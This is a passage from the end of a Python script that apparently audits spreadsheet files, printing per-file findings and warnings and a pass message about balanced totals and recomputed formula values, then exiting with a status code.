        print(("✘ " if found else "✔ ") + f"{os.path.basename(p)}: {len(found)} findings" + ("" if found else " · balanced to the penny, every formula's stored value recomputed"))
        for code, m in found:
            print(f"  {code} {m}")
        for w in warn:
            print(f"  warning: {w}")
    return 1 if total else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
